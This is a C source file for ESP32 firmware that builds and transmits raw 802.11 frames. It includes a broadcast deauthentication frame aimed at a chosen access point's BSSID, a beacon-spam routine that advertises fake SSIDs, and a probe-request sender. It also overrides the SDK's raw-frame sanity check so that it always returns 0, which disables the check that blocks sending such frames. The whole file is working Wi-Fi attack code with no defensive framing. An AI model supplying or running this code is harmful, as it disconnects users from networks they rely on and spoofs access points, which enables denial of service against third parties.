#include "packet_sender.h"

uint8_t line = 0;
uint16_t seqnum[TOTAL_LINES] = { 0 };

static const uint8_t default_deauth_frame[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

static const uint8_t default_beacon_frame[] = {
	0x80, 0x00,							
	0x00, 0x00,							
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff,				
	0xba, 0xde, 0xaf, 0xfe, 0x00, 0x06,				
	0xba, 0xde, 0xaf, 0xfe, 0x00, 0x06,				
	0x00, 0x00,							
	0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,			
	0x64, 0x00,							
	0x31, 0x04,							
	0x00, 0x00, 
	0x01, 0x08, 0x82, 0x84,	0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,	
	0x03, 0x01, 0x01,						
	0x05, 0x04, 0x01, 0x02, 0x00, 0x00,				
};

static const uint8_t default_probe_frame[] = {
    /*  0 - 1  */ 0x40, 0x00,                                       // Type: Probe Request
    /*  2 - 3  */ 0x00, 0x00,                                       // Duration: 0 microseconds
    /*  4 - 9  */ 0xff, 0xff,               0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
    /* 10 - 15 */ 0xAA, 0xAA,               0xAA, 0xAA, 0xAA, 0xAA, // Source: random MAC
    /* 16 - 21 */ 0xff, 0xff,               0xff, 0xff, 0xff, 0xff, // BSS Id: Broadcast
    /* 22 - 23 */ 0x00, 0x00,                                       // Sequence number (will be replaced by the SDK)
    /* 24 - 25 */ 0x00, 0x20,                                       // Tag: Set SSID length, Tag length: 32
    /* 26 - 57 */ 0x20, 0x20,               0x20, 0x20,             // SSID
    0x20,               0x20,               0x20, 0x20,
    0x20,               0x20,               0x20, 0x20,
    0x20,               0x20,               0x20, 0x20,
    0x20,               0x20,               0x20, 0x20,
    0x20,               0x20,               0x20, 0x20,
    0x20,               0x20,               0x20, 0x20,
    0x20,               0x20,               0x20, 0x20,
    /* 58 - 59 */ 0x01, 0x08, // Tag Number: Supported Rates (1), Tag length: 8
    /* 60 */ 0x82,            // 1(B)
    /* 61 */ 0x84,            // 2(B)
    /* 62 */ 0x8b,            // 5.5(B)
    /* 63 */ 0x96,            // 11(B)
    /* 64 */ 0x24,            // 18
    /* 65 */ 0x30,            // 24
    /* 66 */ 0x48,            // 36
    /* 67 */ 0x6c             // 54
};

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void send_raw_frame(const uint8_t *frame_buffer, int size) {
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
    //esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
}

void send_deauth_frame(const wifi_ap_record_t *ap_record) {
    uint8_t deauth_frame[sizeof(default_deauth_frame)];
    memcpy(deauth_frame, default_deauth_frame, sizeof(default_deauth_frame));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
    
    send_raw_frame(deauth_frame, sizeof(default_deauth_frame));
}

void send_beacon_frame(void) {
	uint8_t beacon_frame[200];
	memcpy(beacon_frame, default_beacon_frame, BEACON_SSID_OFFSET - 1);
	beacon_frame[BEACON_SSID_OFFSET - 1] = strlen(ssids[line]);
	memcpy(&beacon_frame[BEACON_SSID_OFFSET], ssids[line], strlen(ssids[line]));
	memcpy(&beacon_frame[BEACON_SSID_OFFSET + strlen(ssids[line])], &default_beacon_frame[BEACON_SSID_OFFSET], sizeof(default_beacon_frame) - BEACON_SSID_OFFSET);

	beacon_frame[SRCADDR_OFFSET + 5] = line;
	beacon_frame[BSSID_OFFSET + 5] = line;

	beacon_frame[SEQNUM_OFFSET] = (seqnum[line] & 0x0f) << 4;
	beacon_frame[SEQNUM_OFFSET + 1] = (seqnum[line] & 0xff0) >> 4;
	seqnum[line]++;
	if (seqnum[line] > 0xfff)
		seqnum[line] = 0;

    send_raw_frame(beacon_frame, sizeof(default_beacon_frame) + strlen(ssids[line]));

	if (++line >= TOTAL_LINES)
	    line = 0;
}

void send_probe_frame(const wifi_ap_record_t *ap_record) {
    uint8_t probe_frame[sizeof(default_probe_frame)];
    memcpy(probe_frame, default_probe_frame, sizeof(default_probe_frame));
    memcpy(&probe_frame[10], ap_record->bssid, 6);
    memcpy(&probe_frame[26], "Megamozg_plus", strlen("Megamozg_plus"));

    send_raw_frame(probe_frame, sizeof(default_probe_frame));
}